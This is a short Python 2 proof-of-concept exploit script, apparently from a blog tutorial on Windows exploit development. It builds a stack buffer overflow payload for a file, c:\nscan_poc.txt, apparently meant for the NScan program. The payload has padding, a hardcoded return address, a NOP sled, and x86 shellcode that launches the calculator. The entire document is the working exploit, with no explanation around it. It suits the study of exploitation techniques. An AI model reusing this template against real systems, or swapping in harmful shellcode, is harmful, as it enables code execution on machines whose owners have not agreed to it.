
# source: http://www.shogunlab.com/blog/2017/08/19/zdzg-windows-exploit-1.html


BUF_SIZE = 1100

payload = 'A'*997
payload += '7c8369f0'.decode("hex")[::-1]   # struct.pack("<L", 0x7c8369f0)
payload += '\x90'*16

shellcode = "\x31\xC9"                  # xor ecx,ecx
shellcode += "\x51"                     # push ecx
shellcode += "\x68\x63\x61\x6C\x63"     # push 0x636c6163
shellcode += "\x54"                     # push dword ptr esp
shellcode += "\xB8\xC7\x93\xC2\x77"     # mov eax,0x77c293c7
shellcode += "\xFF\xD0"                 # call eax

payload += shellcode
payload += 'C'*(BUF_SIZE-len(payload))

with open("c:\\nscan_poc.txt", "wb") as poc_file:
    poc_file.write(payload)
